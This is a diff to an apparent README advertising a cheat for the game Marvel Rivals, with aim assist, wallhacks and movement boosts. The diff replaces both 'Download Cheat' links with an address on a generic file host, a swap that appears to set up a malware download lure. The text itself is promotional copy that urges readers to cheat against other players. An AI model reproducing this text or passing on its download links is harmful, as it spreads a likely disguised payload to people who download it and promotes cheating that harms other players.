@@ -4,14 +4,14 @@
 
 If you're jumping into **Marvel Rivals**, you already know it's wild out there—fast team fights, high-powered abilities, and zero room for error. Want that **overpowered edge**? The **Marvel Rivals Cheat** is built to give you just that: **insane aim assist, wallhacks, movement boosts, and PvP domination** tools that let you **turn the tide of any battle** instantly. 🧠
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/marvel-rivals/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🎮 What Is Marvel Rivals?
 
 **Marvel Rivals** is a squad-based third-person hero shooter, featuring your favorite Marvel characters in fast-paced PvP showdowns. But if you’re stuck with randoms, bad aim, or playing against sweaty teams with cracked mechanics—**you need backup**, and this cheat is your secret weapon. 🎯
 
-[![Download Cheat](https://www.nfkcheats.com/storage/products/screenshots/7a2c935a1a943f08f0a3a86e0b8f525a.jpg)](https://wecheaters.github.io/cheats/marvel-rivals/)
+[![Download Cheat](https://www.nfkcheats.com/storage/products/screenshots/7a2c935a1a943f08f0a3a86e0b8f525a.jpg)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🧩 What This Cheat Can Do
